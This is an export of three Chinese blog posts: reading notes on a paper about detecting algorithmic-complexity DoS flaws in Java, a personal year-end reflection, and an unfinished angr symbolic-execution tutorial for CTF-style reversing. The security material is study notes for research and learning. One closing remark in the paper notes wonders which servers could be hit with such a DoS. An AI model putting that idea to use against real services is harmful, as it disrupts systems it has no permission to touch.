<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2023CCS-Acquirer 算法复杂性漏洞论文阅读笔记</title>
    <url>/posts/19300.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
在做项目，记录一篇论文的阅读笔记
</blockquote>
<span id="more"></span>
<h1 id="摘要">摘要</h1>
<p>JAVA程序中的AC漏洞</p>
<h1 id="一.-引言">一. 引言</h1>
<ul>
<li><p><strong>一些AC漏洞例子</strong> Decompression Bombs:
https://en.wikipedia.org/wiki/Zip_bomb Bilion Laughs Attach:
https://en.wikipedia.org/wiki/Billion_laughs_attack ReDoS:
https://en.wikipedia.org/wiki/ReDoS Hash-table DoS Attack:
https://fahrplan.events.ccc.de/congress/2011/Fahrplan/events/4680.en.html
Zip Bomb:
https://www.theregister.com/2001/07/23/dos_risk_from_zip/</p></li>
<li><p><strong>目前存在的一些问题</strong> state explosions</p></li>
<li><p><strong>ACQIRER的优势</strong></p>
<ol type="1">
<li>继承静态分析器</li>
<li>构建必要的调用上下文和目标程序仪器，自动生成动态符号执行的测试线束，以此来验证漏洞，然后使用注入的程序，执行的测试线束。然后，它使用注入的程序，在从这些模式中学到的分支策略指导下执行选择性动态符号执行，从而高效地验证是否存在两条具有显著成本差异的路径。这种动态验证器有助于ACQIRER排除误报。</li>
<li>它报告的路径约束还能帮助开发人员分析和修复漏洞。</li>
</ol></li>
</ul>
<h1 id="二.-背景">二. 背景</h1>
<ul>
<li><strong>AC DOS</strong> AC DOS attack是一种新的low-bandwidth DoS
attack，它利用了程序中的算法缺陷，具体地说，对于目标程序中接受用户输入的函数，存在两个大小相似的输入，他们的运行时间可能大不相同。</li>
</ul>
<blockquote>
<p>问题一：整理常见的、具有时间复杂度缺陷的算法，并理解为什么会造成这些缺陷</p>
</blockquote>
<ul>
<li><strong>常见诱发AC DOS的算法</strong>
<ol type="1">
<li>排序
<ol type="1">
<li>插入排序</li>
</ol></li>
<li>树遍历</li>
</ol></li>
<li>AC DOS自动/半自动检测方法
<ol type="1">
<li>代码结构分析：识别执行时间可变的程序结构
<ol type="1">
<li>举例：循环/递归</li>
<li>工具：DISCOVER 最先进的静态分析工具
<ol type="1">
<li>定义并收集了一个“循环特征”列表</li>
<li>只能分析基本循环，不能分析包含其他控制结构（条件、跳转和内循环）的复杂循环，因为它们的控制流很难静态确定</li>
</ol></li>
</ol></li>
<li>计算成本分析
<ol type="1">
<li>Fuzz：生成不同的测试输入，以测试不同的程序路径，从而检测高成本路径
<ol type="1">
<li>需要大量工程工作来开发测试线束</li>
<li>自动测试生成功能，要么需要人类定义的现有测试线束，要么为单个方法生成不考虑其调用上下文的人工测试线束</li>
</ol></li>
<li>SE：这块没读明白，之前没了解过SE</li>
</ol></li>
</ol></li>
</ul>
<blockquote>
<p>问题二：了解Fuzz工作原理，了解AC漏洞建模是什么，了解SE，</p>
</blockquote>
<h1 id="三.-问题陈述">三. 问题陈述</h1>
<ul>
<li><strong>研究目标与挑战</strong>
<ol type="1">
<li>AC漏洞建模：提出适用于具有不同计算成本的不同程序的易受攻击代码模式</li>
<li>Path Explosion：找到潜在的易受攻击路径</li>
<li>自动测试：为每个程序自动生成兼容的测试数据</li>
</ol></li>
<li><strong>定义</strong>
<ol type="1">
<li>定义了绝对和相对计算成本，通过测量JVM中已执行指令的数量来估算计算成本，假定所有指令的计算成本顺序大致相同，真正成本取决于具体架构</li>
<li>条件和分支策略生成器</li>
</ol></li>
</ul>
<h1 id="四.-成本差异代码模式-modeling-ac-vulnerability">四.
成本差异代码模式-modeling AC vulnerability</h1>
<ul>
<li>Vulnerable Conditional Patterns
<ol type="1">
<li>概述：生成分支策略的决策依据</li>
<li>分类
<ol type="1">
<li>Non-Determined Loops：没看明白</li>
<li>Single-Branch Conditionals in
Loops：只有一个分支的条件语句，采用该分支会增加计算成本</li>
<li>Termination-Branch Conditionals in
Loops：return/exception，不进入return/exit/异常，就会增加计算成本，但有时异常处理代码的成本也可能会更高(tru-catch)</li>
</ol></li>
</ol></li>
</ul>
<h1 id="五.-acquirer">五. ACQUIRER</h1>
<ul>
<li><p><strong>5.1 功能简介</strong>
按照第四部分介绍的模式来静态分析代码漏洞，并且生成接下来要讲的branch
policies。
然后按照policies，通过动态符号执行，来找出一条快速路径和一条慢速路径，并得出他们的计算开销。
并且还可以为每一个潜在的漏洞生成test harness。
有选择性地过滤非漏洞循环</p></li>
<li><p><strong>5.2 Branch Policy(分支策略)</strong></p></li>
</ul>
<ol type="1">
<li>概述
<ol type="1">
<li>目的：确定快慢路径</li>
<li>程序内静态分析通过全局CFG(控制流图)
<ol type="1">
<li>全局CFG是目标程序的字节码来分析的</li>
<li>We enhance the global CFG with a call graph, where the call target
at a call site includes all the possible callees for polymorphic
calls.这句没读懂</li>
<li>将一些调用函数视作内联函数</li>
</ol></li>
<li>支持通过用户注释来分析external methods</li>
</ol></li>
<li>Determining Branch Choices
<ol type="1">
<li>终止条件：有一条边连到循环外的代码块 /
包含return或throw的代码块</li>
<li>单分支（没太读懂）：</li>
<li>决策(参考listing
1)：绕过结束分支，然后根据单分支的两条路径，选择计算开销大的那个，并继续迭代</li>
</ol></li>
<li>Resolving Branch CHoice Conflicts
<ol type="1">
<li>Conditional in Loop：终止分支 &gt; 未确定循环 &gt; 单分支条件,</li>
<li>Alternative Loops：</li>
<li>Nested Loops：内层循环 &lt; 外层循环</li>
</ol></li>
<li>Loop-level Policy
<ol type="1">
<li>概述：循环级策略，构造了一个循环的“条件-值”的映射</li>
</ol></li>
<li>Function-level Policy
<ol type="1">
<li>概述：函数级策略，我们先通过函数内包含的循环来生成慢速策略，然后通过合并慢速策略来生成函数级策略</li>
<li>Reaching Vulnerable Loops：没看懂</li>
<li>Generating Function Policy：没看懂</li>
</ol></li>
</ol>
<ul>
<li><strong>5.3Selective Dynamic Symbolic Execution</strong></li>
</ul>
<ol type="1">
<li>概述：依据5.2生成的分支策略，通过符号执行来测试快慢分支的绝对和相对计算开销，进而为后续报告漏洞提供数据。</li>
<li>Selective Path
Exploration：没太看懂路径约束是啥，路径约束器求解的又是啥</li>
<li>Vulnerability Validation：有点抽象</li>
</ol>
<ul>
<li>5.4 Test Harness Generation</li>
</ul>
<ol type="1">
<li>概述：包含一个测试执行程序和相关测试脚本，测试脚本应指定要调用的函数/方法，并提供必要的调用上下文（如参数、对象等）</li>
<li>calling context
<ol type="1">
<li>出现目的：当代码量巨大时，编译代码并运行到漏洞位置将会耗费相当长的时间，所以我们希望能够自动生成上下文，然后通过测试脚本来针对这一小段代码进行测试</li>
<li>注意上下文只包含必要的函数/语句，因为有些传进来的参数可能经过”消毒“，已经变得不可控</li>
</ol></li>
</ol>
<p>5.5 Non-Vulnerable Code Block Filtering 1.
概述：过滤不可能利用的循环，进而减少分析时间。该论文采取的策略相对保守
2. 分类 1. Unreachable Loops：过滤绝对无法调用的函数 2. (Almost) -
Constant Cost
Loops：迭代器/计数器以常量为界，或者以”以常量为界“的变量为界的循环，迭代次数可以确定，过滤。
3. Determined Loops：有点没理解</p>
<h1 id="六.-implementation">六. Implementation</h1>
<ul>
<li><strong>6.1 Calling Context Construction</strong>
<ol type="1">
<li>有点晕乎，跟符号执行有关，应该就是生成一段代码，这段代码截取了程序的一个慢速路径和该路径上的所有的传参过程。目的是尽快测试出这条路径的计算开销。</li>
</ol></li>
</ul>
<ol start="2" type="1">
<li>Code Instrumentation
<ol type="1">
<li>更懵了...看起来像是拿自己写的工具里面的一些自己做的类，替换了原来的数据类型，方便在自己的工具里面进行下一步的操作？</li>
</ol></li>
<li>Dynamic Symbolic Execution
<ol type="1">
<li>没读懂</li>
</ol></li>
</ol>
<blockquote>
<p>问题三：了解一下符号执行</p>
</blockquote>
<h1 id="nan.-一些想法">NaN. 一些想法</h1>
<ul>
<li>程序主体
<ol type="1">
<li>我们也要构建CFG的话，首先要对二进制程序的字节码进行反汇编，并且根据反汇编的一些跳转语句，来生成CFG</li>
<li>根据CFG来决策Branch，是否需要一些图论的知识？</li>
<li>modeling AC vulnerability 需要我们人工设定一些路径选择</li>
</ol></li>
<li>扩展
<ol type="1">
<li>可以耦合一些反混淆工具</li>
<li>论文5.4中说”想要静态分析任意代码段的可执行性十分困难“，这个可以作为我们一个进步点来用</li>
</ol></li>
<li>全局问题
<ol type="1">
<li>有什么应用呢？服务器上有什么服务可以让我们通过AC DoS来打一下？</li>
<li>架构不同，机器码不同，反汇编不同。怎么保证都可以用？</li>
</ol></li>
</ul>
]]></content>
      <categories>
        <category>Software analysis technology</category>
      </categories>
      <tags>
        <tag>papers</tag>
        <tag>symbolic execution</tag>
      </tags>
  </entry>
  <entry>
    <title>2024年终总结</title>
    <url>/posts/9333.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
结束最后一科考试，终于能腾出时间来写点东西记录20岁这一年了。
</blockquote>
<span id="more"></span>
<h1 id="为什么会写这篇总结">为什么会写这篇总结</h1>
<p>我以前一直羞于袒露自己的心声。无关痛痒的聊天还好，当我进入到专业知识、世界局势、人生、心理等显露一个人思维深度和知识广度的谈话，就会出现一种不可避免的抽离感监视着我，让我认为自己有些“整瓶不摇半瓶摇”的自大，也让我害怕别人会轻易看破我的愚昧与浅薄。除此之外，观点的不同必然会带来争辩，我不喜与他人发生争执，于是就固步自封，不再与他人有深入的交流了。</p>
<p>但20岁这一年，我结识了更多的人，与羽毛球队的朋友们有了更深入的讨论，因为竞赛和科研与各位同侪有了更多的交流，通过学生工作锻炼了自己的表达力和钝感力。我越来越认同“人和人之间的联系能迸发灵感的火花”，感受到深度关系给人带来的充实感与满足感，变得更加自洽，逐渐可以摆脱抽离感，沉浸于一段交流当中，并且也能够专注于输出我的一些观点和想法了。</p>
<p>因此，在压力没那么大的“后期末时代”、在创作欲旺盛的年初，这篇文章就“应运而生”了，写给每一位读者，包括未来的我。</p>
<h1 id="交流人格与深度关系">交流、人格与深度关系</h1>
<p>既然前文刚提到了深度关系，那就先来谈谈《深度关系》。这本尚未读完的书深深影响了我，使我开始明确意识到自己心理上出现的一些隐性问题，也意识到这些问题都是可以通过科学的方式去建模去解决的。</p>
<p>举个有些抽象的例子。面对非常紧迫的ddl和极大的压力时，我偶尔会在高压工作一段时间后停摆，直到ddl十分紧迫才重新拾起去完成，因此我无法将一些工作做到令我满意的程度。后来我发现自己在停摆的过程中，总会给未完成的任务分配最小的时间，以获得最大的娱乐，但“想象可以是瞬间完成的，现实是需要时间沉淀的”，我无法接受自己的“全能自恋”被挑战被破坏，不愿陷入焦虑的“全能暴怒”或绝望的“彻底无助”。想象自己能用最少的时间完成未竟的任务，虽然满足了“全能自恋”，但这样反而会让我更没有动力去工作，也就愈发沉醉在享乐之中了。当然，不愿意与他人深度交流、害怕自己的浅薄愚昧被看破之类的问题，也都是因为害怕自己的全能自恋被挑战所导致的。</p>
<p>除此之外，想象也只是想象而已，想象只是我对这个世界的主观认识投射到了其他客体或客体的行为。在客观事实面前保持“谦逊”和“克制”，不要用自己的想象去干扰理性分析得到的正确行为，也不要因为自己的想象而陷入“被害妄想”。</p>
<p>《深度关系》里提到热情和自信是一个人最好的两个特质。我想自己距离这两个词汇还相差甚远，不过我的身边就与许多很好的榜样。所以，2025的我，大胆地表达你自己，大胆地提出你的疑问，大胆地与人深入交流，大胆地拒绝别人不合理的要求，大胆地向上社交，大胆地热爱生活。</p>
<h1 id="不适运动与节制">不适、运动与节制</h1>
<p>由于身体健康是头等大事，因此再来讲讲这一点。在跨过20岁的这一年里，我的身体出现了一些症状。国赛初赛头晕了大半天，心肺能力有所下降，头发和肌肉量都在掉，感觉整个人变得越来越油腻。这一年总体上运动量太少，虽然存在手骨折和没有体育课的客观因素影响，但客观因素也成为了每次不运动的“挡箭牌”。“坚持”太难，是一件很耗费行动力的事情，把这些行动融入到生活习惯当中，或许会更容易持续下去。2025要合理饮食，要保证每周有至少三天30min的有氧运动。如果保证不了早睡，那就用早起倒逼早睡。2024成功卫冕思壮杯，希望2025能够在山大杯中更进一步。另外，2024年没有完成的半马希望在2025能够完成。</p>
<p>再补充一点，不要觉得哪天睡过头了或者因为特殊情况熬夜了，之前坚持的努力天数就白费了。用一个月/一个季度/一年的占比去衡量坚持，也不是用累计天数去衡量。总而言之，你的坚持不会因为一天的懈怠而尽数葬送的。</p>
<h1 id="面包与水仙">面包与水仙</h1>
<p>高中背素材的时候背过穆罕默德的“假如你有两块面包，要用其中一块换取一朵水仙花”。如果把面包理解为“在当下这个社会好好生活所需、但你并不喜欢的东西”，把水仙花理解为“能为你带来愉悦体验的东西，但这样东西并不为社会所需”。过去的我认为学习就是我的面包，并且无法分辨我的水仙。但仔细想想，学习中的探索和研究带给我的乐趣是无穷的，面包反而带来了愉悦体验。那何必要把面包和水仙分的这么清楚呢？换句话说，为什么不培养出与面包具有相同能量的水仙，或者与水仙有相同愉悦价值的面包呢？</p>
<p>学习像成瘾品一样，一旦投入进去就几小时几小时的“浪费”，因此我总是害怕沉迷太深就无法体验生活、无法享受游戏、无法享受音乐、无法坚持锻炼。但这是我想的太多了，生活、学习、游戏、音乐、运动……这些人生中的名词其实杂糅在一起，并不是明确分开的。</p>
<p>之前跟朋友们讨论过“看得清与看不清”的问题，既然上述名词都是分不开的，那又何谈看得清看不清？考研、保研、就业……这些选择只是“基于我们目前认知”的贪心算法所走的其中一步，只是基于眼界所给出的局部规划，我们也知道局部最优并不一定是全局最优，因此也无需评价看得清或者看不清。自己的节奏和步履是自己定义的，我可以说自己已经被裹挟到可悲的内卷大潮里了，也可以说自己在潮水的边缘按自己的想法游曳。因此，专注于自己的想法，总是去考虑积极的一面。</p>
<p>这段可能有些抽象，我自己也感觉写得稀里糊涂的。只是觉着以前的自己可能是被长辈们的想法督促着去努力，而现在有了自己的思考，虽然还是有些迷惘，但不会再止步不前了。</p>
<h1 id="科研比赛与学习">科研、比赛与学习</h1>
<p>今年青训营飞了哈尔滨，ccb去了天津，国赛去了南京、太仓和上海。虽然玩得很开心，但比赛并没有取得期望的成果。我发现打比赛好像带来的回报太少了，加上实验压力大，于是下半年逐渐远离了竞赛。但回头再看看，我发现比赛中的题目可以很好的为我的科研提供一些新的idea，而且我还是无法戒掉打比赛的这种刺激感。明年的我，如果你又遇到了休息和比赛二选一的抉择问题，请坚定不移的选择比赛。不要担心打比赛耽误别的事情，休息并不等价于游戏。</p>
<p>另外，今年算是我个人的科研元年，取得了一些小小的成果。但感觉自己的生产力还是不够高，比如我无法在常用的移动设备科学上网，因此有些资料查看起来比较麻烦。还有就是归纳总结能力太弱了，读完论文之后产出太少，也从未踏踏实实地复现过一篇论文。这样的问题应该还有很多，但一时半会写不清楚这些问题。我觉得可以仿照高中时一直用的A4纸学习法，做一个类似的科研工作手册，常看常新。</p>
<p>嗯，先写这么多吧，未竟之事之后想起来再补充。</p>
<h1 id="祝">祝</h1>
<p>新的一年踏踏实实做事，不要远离大地；健健康康生活，不要糟蹋身体。我爱的人都能平平安安，我可以多读几本书、跑个半马、学会一首弹起来真正能让自己有成就感的曲目、山大杯能进四强、科研上更进一步。</p>
<p>祝读者：万事顺遂，喜乐平安。</p>
<h1 id="流水账">流水账</h1>
<p>最后放考完数据库当晚无所事事敲出来的流水账：</p>
<p>年初的印象只剩下考的不怎么好的期末了，然后是寒假的首届信安青训营，没想到蓝帽杯三个月之后就又来了一次哈尔滨，这次认识了很多师傅，也爽游了一下零下二十度的东北。但是最后喜提发烧了，没办法参加结营赛。寒假用rust写了个二进制污点分析的小组件，基于这个组件做了一种漏洞的自动化扫描工具。</p>
<p>寒假结束得很快，迎来了截至目前我感觉课内压力最小的一个学期。但是开学第四周手骨折了，迎来了人生第一次手术。我感觉局麻还是蛮新奇的，不过再也不想有第二次了。第七八周写了资助计划的本子，没想到后续在一众研究生中竞选成功了。这学期修复了寒假写的漏洞扫描工具的一些小bug，然后在其基础上做了用于评估工具的实验，算是为我撬开了科研之门。除此之外，写的一些课内小工具在b站上也小受欢迎（相对我其他的作品而言）。再这之后就是带着护具竞选成为主席，带着护具竞选成为预备党员，带着护具去天津打ccb，去南京打ciscn，玩得很开心，但是比赛没出成绩，有些辜负了各位前辈给予的期望和支持。</p>
<p>暑假比较忙，兼顾隐语、作品赛和密码数学挑战赛，但是这三项比赛都没有达到预想的成果，有些可惜。除此之外资助计划也正式收到了通过的通知，开始投入到了区块链的研究之中。八月中旬去苏州打决赛，期间去了趟从没去过的上海。在那里，终于可以在睡觉时摘下束缚了我小半年的护具。</p>
<p>开学就是大三了，最开始的一个月学生工作压力直接爆表了。我还是高估了自己的能力，也低估了新成立的部门和没有改组的部门带来的工作压力，九月末一些不好的事情也让我陷入了一段时间的低落情绪。不过十月稍微好了一些，在朋友方面的深度关系更进一步，让我与其他人之间的隔阂感减轻了一些，也见识到不同的人的生活方式，在思想上有了比较好的长进。十一月和十二月稀里糊涂的就过去了，这段时间有训练、有吉他、有期中、有一堆实验、有通宵娱乐局、打了第一次飞盘比赛、看了第一次major、打了一次很欢乐的推理本。</p>
<p>十二月中旬就开始备考期末月了，长达一个月的实验+复习压力真的很难捱，但好在轻舟已过万重山。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>年终总结</tag>
      </tags>
  </entry>
  <entry>
    <title>Angr Learning Note</title>
    <url>/posts/15983.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
迈向自动化的第二步——
</blockquote>
<span id="more"></span>
<h1 id="xff-reference">0xFF Reference</h1>
<p><a href="https://heygap.github.io/2023/09/30/blog9/#more">1. Symbolic
Execution Leaning Note (1) -- Basis</a><br />
<a href="https://xz.aliyun.com/t/7117#toc-22">2.
2020年Angr-Api非官方介绍</a><br />
<a
href="https://github.com/jakespringer/angr_ctf/blob/master/SymbolicExecution.pptx">3.
angr_ctf里介绍angr的ppt(讲的真的挺好的)</a></p>
<h1 id="x00-recall-symbolic-execution">0x00 Recall-Symbolic
Execution</h1>
<p>笔者水平有限，如有错误请指出 ;-)</p>
<p>我们先回顾一下什么是符号执行：<br />
我们在逆向一个程序、去找一个程序的漏洞时，我们会希望找到一个<code>input</code>,来触发我们需要的漏洞或者找到我们需要的flag，而符号执行的功能就是<strong>通过遍历程序所有可能的“状态(State)”，找到我们需要的State，进而通过约束求解器，求解出我们最后需要的input</strong></p>
<p>宏观上看，符号执行可以分为<code>三步</code><br />
1. 注入符号 2. 分支 3. 执行分支</p>
<p>我们用一个简单的函数来分别看一下这三步是什么 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// demo func</span><br><span class="line"></span><br><span class="line">Line1  void check_func(char* passwd)</span><br><span class="line">Line2  &#123;</span><br><span class="line">Line3      if(passwd == &quot;HeyGap&quot;)</span><br><span class="line">Line4          printf(&quot;Access granted&quot;);</span><br><span class="line">Line5      else</span><br><span class="line">Line6          printf(&quot;Access denied&quot;);</span><br><span class="line">Line7  &#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="注入符号inject-symbols">1. 注入符号(Inject Symbols)</h3>
<ul>
<li>什么是注入符号？<br />
我们在<code>具体执行</code>的时候，传入的passwd是一个具体的字符串；可我们在<code>符号执行</code>时，传入的是一个<code>符号</code>。</li>
<li>什么是符号？
类比于我们小学学的方程<code>x + 1 = 2</code>，我们可以通过这样一个方程来求解出变量x，我们也称“这个方程约束了这个变量x”；而<code>符号</code>就是方程中的<code>变量</code>，用来约束符号的<code>执行路径</code>就可以类比成<code>方程</code></li>
<li>什么是执行路径？<br />
从State_A到State_B的<code>执行路径</code>就是<strong>从起点A可以执行到终点B的一条指令(instructions)路径</strong>,在每条执行路径中都会维护一个符号变量<code>pc</code>，pc记录了“从A点出发，要到达B的全部条件”，这个符号变量的类型是逻辑表达式，我们可以将这个符号变量扔到SMT求解器（比如z3）中去求解满足这个符号变量中所有约束条件的1~n个解</li>
<li>Example<br />
在上述例子中，我们将一个符号传入passwd中，就是注入符号。</li>
</ul>
<h3 id="分支branching">2. 分支(Branching)</h3>
<ul>
<li>什么是branching<br />
由于我们的符号是一个待确定的值，所以我们在遇到<code>判断语句</code>时，当前的State会设置为执行完毕(already
executed)，然后激活(active)两个新的state，由于要遍历全部state，符号在判断语句中得到不同返回值，而这两个state就是不同返回值进入的不同分支的起始状态</li>
<li>Example
在上述例子中，可以理解为Line1-2为state1，当执行到Line3时，state1设置为执行完毕，同时激活state2和state3，state2为Line4，state3为Line6</li>
</ul>
<h3 id="评估分支evaluate-each-branches">3. 评估分支(Evaluate Each
Branches)</h3>
<ul>
<li>什么是Evaluate Branches？<br />
我们会评估(Evaluate)每一个active的state，判断他们是否符合我们的需求，如果不满足就设置terminated，如果遇到判断语句就进入第二步</li>
<li>Example
假设当前激活的state为2和3，如果我们需要“标准输出中包含'granted'”，那符号执行器就会评估state2，发现这个state符合我们的要求，于是将state2加到found数组中；然后再评估state3，发现不符合，设置为terminated</li>
</ul>
<h1 id="x01-an-introduction-to-angr">0x01 An Introduction to Angr</h1>
<h3 id="出现的class">1. 出现的class</h3>
<p>笔者在此记录相对重要的class，读者可以通过阅读源码或官方手册等方式，先弄清楚这些class的作用
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SimState</span><br><span class="line">Simulation Manager(simgr)</span><br></pre></td></tr></table></figure></p>
<h3 id="symbolic-execution-in-angr">2. Symbolic Execution In Angr</h3>
<p>通过0x00，我们知道在符号执行中，<code>执行路径</code>和<code>符号</code>是最重要的两个东西
- Angr中的执行路径<br />
1.
我们知道每branch一次，就会添加两个state，而在Angr中，维护路径信息的pc由<code>SimState</code>
Object组成，SimState用∩链在一起就组成了pc 2.
由于我们要遍历全部state，所以我们需要有一个管理器来管理全部执行路径(a
Set of
Path)，这个管理器就是<code>Simulation Manager (simgr)</code>,下图为Angr中生成全部路径的过程
<img src="/pic/1.png" /> 3.
上图提到<code>until we find what we want</code>，simgr提供了函数<code>explore</code>，可以让我们通过两种方式来找到我们需要的state<br />
1. 通过指令在text段的地址 2. 通过任意体现state特征的函数</p>
<ul>
<li>State Explosion
<ol type="1">
<li>但是单纯的遍历每一条路径会存在状态爆炸(State
Explosion，有些地方也叫路径爆炸)的问题，来看下面这个循环
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x；</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(x &gt; <span class="number">10</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Good&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>当i=1时，管理器会创建两个state，而i=2时，先前的两个state有分别会创建两个state，当i=100时，我们就会出现2^100个state，这就是状态爆炸问题</li>
<li>而explore也为我们提供了一个参数avoid，效果就是<code>剪枝</code>，在explore中添加avoid参数会帮助我们提前terminate那些我们不需要的state，因此这个state后续的branch就不会再跟进</li>
</ol></li>
</ul>
<h1 id="x01-库架构分析">0x01 库架构分析</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">angr</span><br><span class="line"> | - Project()</span><br><span class="line">		 | - factory</span><br><span class="line">				 | - state</span><br><span class="line">					   | - entry_state()</span><br><span class="line">					   | - blank_state(addr)</span><br><span class="line"></span><br><span class="line">					   | - regs.eax/ebx/...</span><br><span class="line">					   | - solver</span><br><span class="line">							  | - BVS</span><br><span class="line">							  | - eval</span><br><span class="line">					   | - fs</span><br><span class="line">						    | - insert(string filename,angr.storage.SimFile())</span><br><span class="line">				 | - simulation_manager(init_state)</span><br><span class="line">						 | - explore(find,avoid)</span><br><span class="line">						 | - found[]</span><br><span class="line"></span><br><span class="line"> | - storage</span><br><span class="line">		 | - SimFile(filename,content,size)</span><br><span class="line"> | - sim_options</span><br><span class="line">		 | - SYMBOL_FILL_UNCONSTRAINED_MEMORY</span><br><span class="line">		 | - SYMBOL_FILL_UNCONSTRAINED_REGISTERS</span><br><span class="line"></span><br><span class="line">found_state</span><br><span class="line">	 | - posix</span><br><span class="line">		   | - dumps(std)</span><br><span class="line">	 | - solver</span><br><span class="line">		   | - eval(claripy.BVS pass,cast_to)</span><br></pre></td></tr></table></figure>
<h1 id="x02-api手册">0x02 API手册</h1>
<ul>
<li><strong>Project类(参数、功能、重载、返回值)</strong>
<ol type="1">
<li>构造函数参数：“命令行中运行程序的指令”(eg: "./00_angr_find")</li>
<li>功能：“构建一个符号执行项目”</li>
<li>附属成员
<ul>
<li><strong>factory</strong>
<ol type="1">
<li>附属成员
<ul>
<li><strong>state</strong>
<ol type="1">
<li>重载函数
<ul>
<li><strong>entry_state()</strong>
<ol type="1">
<li>返回值：程序入口点</li>
</ol></li>
<li><strong>blank_state(addr)</strong>
<ol type="1">
<li>参数：模拟执行开始的地址</li>
</ol></li>
</ul></li>
<li>附属成员
<ul>
<li><strong>regs</strong>
<ol type="1">
<li>附属成员: 各种寄存器</li>
</ol></li>
<li><strong>fs</strong>
<ol type="1">
<li>全称: filesystem</li>
<li>附属成员：
<ul>
<li><strong>insert(string filename,angr.storage.simFile)</strong>
<ol type="1">
<li>参数1：文件名称</li>
<li>参数2：创建过的符号化文件对象</li>
</ol></li>
</ul></li>
</ol></li>
</ul></li>
</ol></li>
<li><strong>simulation_manager类</strong>
<ol type="1">
<li>构造函数参数：起始状态</li>
<li>功能：设置模拟执行的起始地址，并返回实例化对象</li>
<li>附属成员
<ul>
<li><strong>explore(find, avoid)</strong>
<ol type="1">
<li>参数find：希望程序抵达的地址</li>
<li>参数avoid：希望程序不抵达的地址</li>
<li>功能：用符号探索到find指向的地址，并避免avoid指向的地址</li>
<li>重载：explore(find=func1,avoid=func2) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def func1(state):</span><br><span class="line">	return b&quot;Good Job!&quot; in state.posix.dumps(1)</span><br><span class="line">def func2(state):</span><br><span class="line">	return b&quot;Try Again!&quot; in state.posix.dumps(1)</span><br></pre></td></tr></table></figure>
<ol type="1">
<li>功能：探索具有func1特征的的函数分支，回避具有func2特征的函数分支</li>
</ol></li>
</ol></li>
<li><strong>found数组</strong>
<ol type="1">
<li>found_state的实例化数组</li>
</ol></li>
</ul></li>
</ol></li>
</ul></li>
</ol></li>
</ul></li>
</ol></li>
<li><strong>found_state类</strong>
<ul>
<li><strong>posix</strong>
<ul>
<li><strong>dumps(int std)</strong>
<ol type="1">
<li>参数std: stdin(0)/stdout(1)/stderr(2)</li>
<li>功能: 将std指向的内容打印出来</li>
</ol></li>
</ul></li>
<li>solver
<ul>
<li>eval(claripy.BVS arg1)
<ol type="1">
<li>参数：要求解的约束公式</li>
<li>功能：求解arg1并返回结果</li>
</ol></li>
</ul></li>
</ul></li>
<li><strong>claripy类</strong>
<ul>
<li><strong>BVS类</strong>
<ol type="1">
<li>构造函数参数：arg1: 别名 | arg2: 符号向量占多少位</li>
<li>功能：构建一个空的约束公示</li>
</ol></li>
</ul></li>
<li><strong>storage类</strong>
<ul>
<li>SimFile(filename,content,size)
<ol type="1">
<li>参数filename：要引入的filename</li>
<li>参数content：符号化向量</li>
<li>参数size：要从文件中读取的字节数*8（单位：bits）</li>
<li>功能：创建一个符号化的文件对象</li>
</ol></li>
</ul></li>
<li><strong>sim_options类</strong>
<ul>
<li>SYMBOL_FILL_UNCONSTRAINED_MEMORY
<ul>
<li>功能：自动用符号填充未约束的内存（模拟过程中没有明确值的内存位置）</li>
</ul></li>
<li>SYMBOL_FILL_UNCONSTRAINED_REGISTERS
<ul>
<li>功能：自动用符号填充未约束的寄存器</li>
</ul></li>
</ul></li>
</ul>
<h1 id="x01-angr语法">0x01 Angr语法</h1>
<h3 id="准备阶段">1. 准备阶段</h3>
<ul>
<li><p><strong>引入与初始化</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(exec_path)</span><br><span class="line"></span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line"><span class="comment"># init_state = p.factory.blank_state(addr) # addr = 0xbeef</span></span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>命令行引入参数</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">	arg1 = argv[<span class="number">1</span>]</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main(sys.argv)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>符号向量</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">pass1 = claripy.BVS(<span class="string">&#x27;pass1&#x27;</span>, <span class="number">32</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>符号化寄存器</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">init_state.regs.eax = pass1</span><br></pre></td></tr></table></figure></p></li>
